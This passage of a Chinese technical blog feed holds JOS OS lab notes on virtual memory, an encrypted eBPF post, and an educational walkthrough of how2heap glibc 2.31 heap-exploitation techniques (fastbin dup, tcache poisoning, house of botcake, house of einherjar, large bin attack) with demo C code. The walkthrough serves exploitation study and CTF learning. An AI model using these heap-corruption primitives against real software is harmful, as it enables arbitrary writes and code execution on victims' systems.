4MB），这个页表仅仅映射了4MB的内存，在我们的JOS系统中，我们希望能拓展到物理内存的头256MB空间上，并且把这部分物理空间映射到从0xf0000000开始的虚拟空间中，以及一些其他的虚拟地址空间中。</p><p>一旦进入了保护模式，我们就不能直接使用线性地址或者物理地址了。所有代码中的地址的引用都是虚拟地址的形式，然后被MMU系统所转换，所有C语言中的指针都是虚拟地址。</p><p>JOS内核通常需要把地址按照以一种模糊的值或者整数值的形式来操纵，而不是直接解析引用，比如物理内存分配器。有时使用虚拟地址，有时使用物理地址。为了能够帮助我们记录代码，JOS源文件中的地址被区分为两种情况：</p><p>　　uintptr_t – 表示虚拟地址</p><p>　　physaddr_t – 表示物理地址</p><p>这两种类型其实都是32位的整型数(uint32_t)，所以如果你把一个类型的变量的值赋给另一个类型变量，编译器不会报错。但是由于他们都是整型数，所以如果你打算解引用(deference)他们，编译器会报错。</p><p>JOS内核可以先对uintptr_t类型的值进行强制类型转换，然后再解析引用。但是对于physaddr_t的值，我们不能这么做，因为内核是需要MMU（内存管理单元）来首先对你输入的地址进行转化的，如果你对physaddr_t进行强制类型转换再解引用，最终你得到的你要访问的地址，可能不是你要找的真实物理地址。</p><p>所以</p><p><img src="https://images2015.cnblogs.com/blog/809277/201603/809277-20160316103653162-1590673802.png" alt="img"></p><blockquote><p><strong>Question</strong></p><p>假设下面的JOS内核代码是正确的，变量x应该是什么类型的，uintptr_t还是physaddr_t？</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mystery_t</span> x;</span><br><span class="line"><span class="keyword">char</span>* value = return_a_pointer();</span><br><span class="line">*value = <span class="number">10</span>;</span><br><span class="line">x = (<span class="keyword">mystery_t</span>) value;</span><br></pre></td></tr></table></figure><p>应该是uintptr_t。第三句对*value进行了赋值，所以value肯定是一个虚拟地址，因为直接解引用物理地址是没有意义的。那么x肯定也是虚拟地址，要不然将虚拟地址赋值给一个物理地址也没有意义的。</p></blockquote><p>JOS内核有时需要读取或者修改内存，但是这时有可能他只知道这个要被修改的内存的物理地址。举个例子，当我们想要加入一个新的页表项的时时，我们需要分配一块物理内存来存放页目录项，然后初始化这块内存。然而，内核，它是不能绕过 虚拟地址转换 这一步的，因而它也不能直接加载或者存储物理地址。那么我们如何把物理地址转换为虚拟地址，我们可以采用KADDR(pa)指令来获取。其中pa指的是物理地址。同样的，如果想通过虚拟地址的值求得物理地址的值，我们可以采用PADDR(va)指令。</p><h3 id="Reference-counting"><a href="#Reference-counting" class="headerlink" title="Reference counting"></a>Reference counting</h3><p>在之后的实验中，将会经常遇到一种情况，多个不同的虚拟地址被映射到相同的物理页上。这时我们需要记录一下每一个物理页上存在着多少不同的虚拟地址来引用它，这个值存放在这个物理页的PageInfo结构体的pp_ref成员中，当这个值为0时，这个物理页才可以被释放。通常来说，任意一个物理页的pp_ref值等于它所在的页表项中，被位于虚拟地址UTOP之下的虚拟页所映射的次数(UTOP之上的地址范围在启动的时候已经被映射完成了，之后不会被改动)。当我们使用page_alloc函数的时候需要注意。它所返回的页的引用计数值总是0，所以pp_ref应该被马上加一。</p><h3 id="Page-Table-Management"><a href="#Page-Table-Management" class="headerlink" title="Page Table Management"></a>Page Table Management</h3><p>现在我们可以着手开始编写管理页表的程序了：包括插入删除线性地址到物理地址的映射关系，以及创建页表等等。</p><h2 id="Part-3-Kernel-Address-Space"><a href="#Part-3-Kernel-Address-Space" class="headerlink" title="Part 3: Kernel Address Space"></a>Part 3: Kernel Address Space</h2><p>JOS把32位的线性地址虚拟空间分为两个部分。其中用户环境(进程运行环境)通常占据低地址的那部分，叫用户地址空间。而操作系统内核总是占据高地址的部分，叫内核地址空间。这两个部分的分界线是定义在memlayout.h文件中的一个宏ULIM。JOS为内核保留了256MB左右的虚拟地址空间，</p><h3 id="Permissions-and-Fault-Isolation"><a href="#Permissions-and-Fault-Isolation" class="headerlink" title="Permissions and Fault Isolation"></a>Permissions and Fault Isolation</h3><p>由于内核和用户进程只能访问各自的地址空间，所以我们必须在x86页表中使用访问权限位(Permission Bits)来使用户进程的代码只能访问用户地址空间，而不是内核地址空间。否则用户代码中的一些错误可能会覆写内核中的数据，最终导致内核的崩溃。</p><p>处在用户地址空间中的代码不能访问高于ULIM的地址空间，但是内核可以读写这部分空间。而内核和用户对于地址范围[UTOP, ULIM]有着相同的访问权限，那就是可以读取但是不可以写入。这一个部分的地址空间通常被用于把一些只读的内核数据结构暴露给用户地址空间的代码。在UTOP之下的地址范围是给用户进程使用的，用户进程可以访问，修改这部分地址空间的内容。</p><h3 id="Initializing-the-Kernel-Address-Space"><a href="#Initializing-the-Kernel-Address-Space" class="headerlink" title="Initializing the Kernel Address Space"></a>Initializing the Kernel Address Space</h3><p>现在我们要设置一下UTOP之上的地址空间：这也是整个虚拟地址空间中的内核地址空间部分。inc/memlayout.h文件中已经向你展示了这部分地址空间的布局。你可以使用你刚刚编写的函数来设置这些地址的布局。</p><blockquote><p><strong>Question</strong></p><p>到目前为止页目录表中已经包含多少有效页目录项？他们都映射到哪里？</p><p>3BD号页目录项，指向的是kern_pgdir</p><p>3BC号页目录项，指向的是pages数组</p><p>3BF号页目录项，指向的是bootstack</p><p>3C0~3FF号页目录项，指向的是kernel</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;lab2中多出来了几个文件：&lt;/p&gt;
&lt;p&gt;inc/memlayout.h&lt;/p&gt;
&lt;p&gt;kern/pmap.c&lt;/p&gt;
&lt;p&gt;kern/pmap.h&lt;/p&gt;
&lt;p&gt;kern/kclock.h&lt;/p&gt;
&lt;p&gt;kern/kclock.c&lt;/p&gt;
&lt;p&gt;memlayout.h描
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="OS" scheme="https://billyotry.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>【eBPF】Overview</title>
    <link href="https://billyotry.github.io/2021/07/28/%E3%80%90eBPF%E3%80%91Overview/"/>
    <id>https://billyotry.github.io/2021/07/28/%E3%80%90eBPF%E3%80%91Overview/</id>
    <published>2021-07-28T13:56:10.634Z</published>
    <updated>2021-07-28T15:11:34.398Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fd43914a7a4b48ea9b1544ca548e8a027c8279f74e54fadb25bd468a772066b1">60c8fb4a25acc80be70b6eda0913804634b0eab35fd83bcfcaa9879cf933cfe4d23ea146798578d753de426c9106acc8a16649dc7535f4180445923d9930e4b129413e04e3de1b8e1f0b5ddfc600489c0bb66ada6368c35183af01bf7ed78b5c650bc08236b6439a7097a1bd5284ddfad1efd00db10a32cc9febb14e8cbfc5c32087c22ae2c0b5183923a757e7c196529184ce917d46c1cc3a6f580f8c069b0227133d55457f1935be53618ba722691472ea0462d510f095c1b76a71b848081efbf6f4b2959b5b7fb1a6055844f28742b27b3ea2894e7d3085851a50a8c9a55b6b83ba85a1ec790999a3ff175a71431c35008eb233e47d7b644705b3ef4c4ba14decc15ff9f146c1e0fb321ecdbaecf9ff30e7f72a4e063c7091b1f8bb66dbb97ab26e5002919bd7b1e37cf6d4966c93ded5fc7698f10d5c8a5c0c126fded1c25a48cd34f5296af66d2995e413817fba0495f1cec3e93143a84fc8efd04b4afde2de9905b8d24476cdea508d8cdaa7826397434ee14bea64a48e1daa1a3345bb3de9c1e03a4ea1bcc1083eb638c13eaa6c3bef02e6c68cc74de1d5520de96952a20a9b2e704c7525e9f0454eb0abbad84460e47e9fc2562ff016f6d87125b6fbde36ba9e5dfca54177e5736a5fd4b4fd8776ab419fb81472bfa31a33319f97740f396e9a2b319e86f2bf19cbbe4140fa13220140b786ef97bf4ee72a34d9c4ae9e2a86ae1cb6613e59ce108e0953a4bd2eb9d5c7aab7239489abcc232120e1a334c8a266bfb0908e66c76c01272dde79a4c38e0b24d7f103d2284d8f3907c5cd41271572c0bb8e0613bdf20a8845e9cbbb8be31eb9b21bc3b7f3bdb72a7766af56db3038c5efccc85ddee130ad8aaec710f419091113af779f78ef10c623b816c5cbfa459009192c6433dcb017bb73dd586657c6b6d93255d1f6c315da1683886777379b294b140092bcc020c486b12b15cabe66bc3d07c77da8fde8ad42c155565ee81ba20620e16811556bce94a1a544d72f852a7db3208ff993ab09a63b727b04f0632cfc975c29acd4d0d45ee1ce23ee61a81bfa95c60be81bb4930e32423bbdbf4c873d2f4c90dbcb1fa2a45a82a0dfa6830c0055aa89dc7b3bce1201774a9d15c3149251d5499ede1b1fcc08a877843eac16b18dd818987ce10c0cf460e495eaee0ff56fda3e8756afc5f3717e1fd90c592ee69187225e89a997b3cdfbab5836c4ea66aacdf69b86a67350c457f6cc06d2b8d52a99a8f5bb88f87024f3f8614b8f9e27cb9fb47191e152c2159093c42a275334ed9f674885bfb52b359a22748448b55bdebb72c70b678218f212975401ca2e12233e758c422ec17d3bfcc5cc50eb53a4af9a62be1f56e1d82377deadaa03ec0a3bb0bde1859345bef10dfea4a55f32481587c02fa8b7eaf89ad6d0d09b6410d4d5512a4ce992788c837d4c5acd64b0f968461a17862f144629f3293818c303c3e4e583c504f2006f7e6fd3b4e1ab8557ebe0ebf0a1d64a80cb951ce76bab6bec0d20e45e968cea4669f5bc6a376665388d0c68ce82619a08c627ed9091dd3a15627764937b7c3586dc7fb2e32e12c03e931143e6d97610be422355c162c128a376ce6e03b081d153c67e0bf0bfdadef9c3121b1b828bf502bf34db0ebed5441030e6a5489e0911d6f72cc55d6ae61804d503a89f5785c102055c682935b84e76eeb858d3eabd178f1d7f3e6bcdac7dad2c9e5a1bf3cd023dd5edb7aec3059b926c34a3be82ee2b38fdf73e2cf00546174fbe0621f748ae89428ec41fad5aec9710c1ac6b7876d29dc430333fad4d0f6f991585189d90f02dc291743d0ed532a98a7e9fa7c39b318aee4c0e94da89a7e327df7799fda2370c778f06945b90d13c17ad38d2715f3774cd58698a54efbfaa6f9afb542061a89f996285bbc50e97eb1fde22a658d36313a19e8b7633d9dcde0295d9c041d1ffa2f94dba8acb317aef87065cdd646b7875b0161e65f4e6a511281d049633339c87b4df5794633db2c4e8c27756f8efe8579e8eddd3b8093acae27c9a8a8ae5b655292e514333003cc05bde56e6910a3608b0b5edfa7c244295691944b5f507aafd300428cb3d895ffda9029b01ebdf2b1238bd6b785e1f2b1dc833aa8cf223667a5477ae22f46483d70a17bb71f371cc5d11cc5f87a2b182859f6b97b4e28c7f35227d124864819db52b7698ab7731df47c59c76d13b4a4955506c4b3b90a4908739bb21d344eff2e3fbaa28bc1d8f68415f831fbe46604e1974d1fc41b1f58122216ad7b1a13ccdd0f786996f269913bf97fa254f2556a768636ae0f9767ef1bcc98c7cf8bb333de16dce3b744ddc350fb4cf4acf9ee0b529d34dc3854ff7bfdf926ea03a8107cfb5f7a43e859a7bc35c1cc903a666674306cb712cd7cdd1eb2a4deeb49ed2a8d6b46f7d41e94ba7d729df5bbafb67fd04278540bb554ecceaa083b6c72e3ae46ad44d19f1fd0ae32e522192f644398ac9df0175b03a7b6beb3a9b109b80e409e01792ab280316ef5cf08e8349d598de2e51a59aa377791598ac7d60a8628aec35c945c593bc367cff419349df53697c76fe83cf04a171ab5271c3abdf8dba366c9d00fe9e20d765cf0a994178151215099c57bde43c8b339f3180833b97c26164137e8c9e43e4c3e6c6bd986d48d0d7a54d5e9c919eda0600ec93ffbaf0d96d4c3fa786d62128531c9bc4c0dbdbb85ebc110a9aee1e6c42e403fbc0ef8747e7518aafff5dd66787ea098407ae1ee227e35f912d5d6e8c2d9c53a1e9fcd55401acc6a3a75a4e3e2543764f18c332a95af3257fb8f17157f47c2c6e12ae4086e6028eff549e3d8c6e6721af49a0f2c9e71f1ed00b0f8a59b7d8c517749d80f7c0a0b372efd77941f130d01528d7952f2bfbcfb5f0f6b5b99708025c6189cc21cdb587b657e6f86be0985798e103b410f501590db98d211bf342d6f8b0afe8808e94bbebe18daf8f736a7a3f4feabda28e8a142c96afa0ed9bb51999ba01bcce4e285123615409ef6577adbe6b4eda6b18c69baa19aff13894b4ad5140fc1b0083534ebf45946ac72c0f951c12a0a20698fc0a8c4dc81d8ab5871221df08cc5a636d97b605836fa22e4cdb52a2494ee33ecc20b275bd6b35ede6a89dfdb35ae74e1ade423c0a3d9a12e80218316492814780c45c074993933a21a5019def3786167cc575007313e8164e96208ad93ce588ef5349cdc08fd6a5dbe186acc597169aaae07d12d9d91e4c54dc111d26f5714b102dda88b15e4f90a617fe7e32cdc118b407339561b816d8ed818973fcbcf963d507e625a6813e1cf069f36285230f61e18f118ed2e5d17363ccd026875839b0466781c60f4c20969c28e2210ec91aaa237f05e0ba0f1e82854ba2b900ff165c2d5895af266540f394d2b1fba73b26ebebaf4a63a6caaaaff70e5498e69c35d11b8d3732d07f3dc9708083c2fb5428b0fd4096c244e9f04b9227b41e1ad85f11e2d766350fd2856774ef875c2f3f157a916a04e7ae2f3a47b9141726095596b61918859eb41665b97daa86551899f44840493021c0f3e97b60cf94ef4fdd1c70e625b5ab46fee7f7c1a7105af54cada2e6fbe527bd952d1c057c3f31c0562e810689ba5a6fa138ace228c621e7006d71ee5bcf7190d7a574ae31bcfb078c58653089b1b5321ae4e54f32e8e17d9c9ef0b651c2d9a2a3ba2ad93b1feed47e6d941c1d0a0077c98a3e753cb184c879d219f16500053b04c03c5017a7554c8f8ad76d6ec201701ef495d7a086c2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="Kernel" scheme="https://billyotry.github.io/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>Educational Heap Exploitation 2.0 (how2heap glibc 2.31)</title>
    <link href="https://billyotry.github.io/2021/07/17/Educational%20Heap%20Exploitation%202.0%20(how2heap%20glibc%202.31)/"/>
    <id>https://billyotry.github.io/2021/07/17/Educational%20Heap%20Exploitation%202.0%20(how2heap%20glibc%202.31)/</id>
    <published>2021-07-17T09:36:04.750Z</published>
    <updated>2021-06-06T15:19:41.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-fastbin-dup"><a href="#1-fastbin-dup" class="headerlink" title="1. fastbin_dup"></a>1. fastbin_dup</h2><p>关于 fastbin attack 在glibc 2.31 上没有什么变化，这里给的样例是通过 double-attack 漏洞修改构造两个指针指向同一个 chunk 的情景</p><p>程序首先 malloc 了 8 此，然后 free 了 7 次（用来填充tcache bins）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时 tcache bins 已经填满</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618049605/0" alt="image-20210605215153140"></p><p>然后用 calloc 分配了 3 个chunk，使用 calloc 分配的时候，此时不会从tcache bins拿已经 free掉的 chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p>然后进行 double free 操作即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>至此怎么利用懂得都懂，就不多说了</p><h2 id="2-fastbin-reverse-into-tcache"><a href="#2-fastbin-reverse-into-tcache" class="headerlink" title="2. fastbin_reverse_into_tcache"></a>2. fastbin_reverse_into_tcache</h2><p>首先分配一定数量的chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">   ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后 free 填充我们的 tcache bins</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618069283/0" alt="image-20210605215933226"></p><p>释放我们的目标 chunk 即 ptrs[7]</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line"><span class="built_in">printf</span>(</span><br><span class="line">  <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">  <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">  <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">  victim</span><br><span class="line">);</span><br><span class="line"><span class="built_in">free</span>(victim);</span><br></pre></td></tr></table></figure><p>接着释放剩下的 8 - 14 的chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>此时的bin</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618081765/0" alt="image-20210605220337747"></p><p>假设我们有一个堆溢出漏洞，可以覆盖 victim 的内容，我们此时将栈上一个构造好的list的地址赋予 victim</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">*(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>此时的victim如下</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618090767/0" alt="image-20210605220650657"></p><p>接下来我们 malloc 7次，清空 tcache bin</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Empty tcache.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现 fastbin 的最后一个 chunk 的 fd 被我们改成了 stack 的地址</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618097007/0" alt="image-20210605220931514"></p><p>此时我们malloc一次，会发现</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618102417/0" alt="image-20210605221133082"></p><p>此时，原本在 fastbin 的chunk list 都被放到了 tcache bins里</p><p>如果我们最后再malloc一次，我们就能拿到栈地址（ tcache 不检查size域）</p><p>这里具体为什么会这样，我也8知道，我调试发现首先会从fastbin的链表头开始将chunk放入tcache</p><p>我猜测可能是fastbin大于7个的时候，就会这样，并且是从fastbin链表头开始，所以进入到tcache的时候就会返过来。</p><p>后面就不用说了，再次分配就能分配到栈上了。</p><h2 id="3-house-of-botcake"><a href="#3-house-of-botcake" class="headerlink" title="3. house_of_botcake"></a>3. house_of_botcake</h2><p>一种 tcache poisoning attack ，通过一些手段，在tcachebins 中写入目标地址</p><p>此时我们的tcache bin被填满</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618161189/0" alt="image-20210605223658518"></p><p>然后我们 free a 再 free prev，由于 prev 与 a 是相邻 chunk，所以会触发合并</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure><p>触发合并后，在 unsorted bin 里的是 prev chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618196491/0" alt="image-20210605225221216"></p><p>然后我们要想办法把 chunk a 放入tcache bin里，由于此时tcache bin 是满的，所以我们先取一个出来，然后在 free 一次 a。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"><span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br></pre></td></tr></table></figure><p>此时 a chunk 就会被放入 tcahcebins 里，同时 prev 可以控制 chunk a 的内容</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618201263/0" alt="image-20210605225447090"></p><p>所以我们从此时的 unsortedbin 给他分一块出来，然后修改其 fd 的值</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618223423/0" alt="image-20210605230443691"></p><p>那么此时我们就成功污染了 tachebin 的内容</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618224833/0" alt="image-20210605230517758"></p><p>我们接着只需要两次 malloc 就能拿到 0x7fffffffddc0 这个地址</p><p>其实就chunk_overpaping，一个大的chunk，包含了一个chunk，堆风水有什么好学的（逃</p><h2 id="4-house-of-einherjar"><a href="#4-house-of-einherjar" class="headerlink" title="4. house_of_einherjar"></a>4. house_of_einherjar</h2><p>这里展示的是通过一字节溢出，取到任意地址的技术</p><p>首先在堆上伪造一个 chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br></pre></td></tr></table></figure><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618291214/0" alt="image-20210605233802077"></p><p>我们再申请chunk b和chunk c </p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618294763/0" alt="image-20210605234002884"></p><p>然后此时假设我们有一个一字节溢出，可以覆盖到 c chunk 的size域，此时chunk c的pre inuse位置零，从0x101变成了0x100，因为新版本的原因，我们还要伪造pre_size为0x60</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618323935/0" alt="image-20210605235608527"></p><p>紧接着，照样填满 tcache, 然后我们去free chunk c，由于 chunk c 的 prev_inused 为0，则认为前面的 chunk 是free 的此时会有一个向前合并的过程,这样我们就会有两个指针指向 fake chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618328608/0" alt="image-20210605235838014"></p><p>然后我们此时再 malloc 一个 0x158 大小的chunk ，合并后大小为 0x160, 然后此时 合并后的 chunk 就会被整块取出,</p><p>然后我们在进行如下操作</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line"><span class="built_in">free</span>(pad);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>那么此时 chunk b 也会加入到 tcache bin里，且指向了刚 free 的 pad chunk</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618337803/0" alt="image-20210606000151527"></p><p>由此， chunk d 可对 chunk b进行任意修改 （堆块重叠了）</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13618353003/0" alt="image-20210606000442998"></p><p>接下来怎么做就不讲了</p><h2 id="5-large-bin-attack"><a href="#5-large-bin-attack" class="headerlink" title="5. large_bin_attack"></a>5. large_bin_attack</h2><p>通过该技术向目标地址写入一个大值</p><p>2.30 之后关于 largs bin 的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里加了两个检查</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted </span></span><br><span class="line"><span class="string">(nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>导致传统的 large bin attack 没法使用</p><p>但是存在一个新的利用路径:</p><p>首先分配如下堆块</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"><span class="keyword">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"><span class="keyword">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br></pre></td></tr></table></figure><p>0x20 的为 guard chunk，避免 free 之后 chunk 合并，然后我们 free p1，此时 chunk p1会放入unsorted bin</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619120901/0" alt="image-20210606104412366"></p><p>然后我们再 malloc 一个比 p1 大的 chunk（我猜是为了不切割 p1），此时 p1 会被放入到 largebin</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619123801/0" alt="image-20210606104519006"></p><p>然后我们再 free p2（p2 大小小于 p1和p3），此时 p2 就会被放入到 unsorted bin里</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619134703/0" alt="image-20210606104906680"></p><p>然后我们修改 p1 的bk_nextsize 指向 target-0x20，此时 p1 在 largebin 里</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619506350/0" alt="image-20210606130910387"></p><p>然后我们再 malloc 一个比 p2 大的 chunk（此时 p2 在unsorted bin 里），那么此时，就会将 p2 从unsorted bin取出，放入到largebin 里，那么就存在如下代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 victim 是 p2 ，fwd为largebin表头，bck为 largebin 中的最后一个chunk，也就是最小的那个，也就是我们这里的 p1</p><p>最后的效果就是</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13619984845/0" alt="image-20210606161034580"></p><p>通常而言，这种写大数的行为，我们可以用来修改 <code>global_max_fast</code>。这里为什么想到的，估计是根据victim-&gt;bk_nextsize可控，那么victim-&gt;bk_nextsize-&gt;fd_nextsize可控就能写入一个vitcim。那么为什么victim-&gt;bk_nextsize，反推回去就是fwd-&gt;fd-&gt;bk_nextsize可控，这个可控翻译过来<strong>其实就是largebin中链表尾部，也就是最小的那个chunk的bk_nextsize可控，然后再其中写入 目标地址-0x20</strong></p><h2 id="6-overlapping-chunks"><a href="#6-overlapping-chunks" class="headerlink" title="6. overlapping_chunks"></a>6. overlapping_chunks</h2><p>通过修改 size 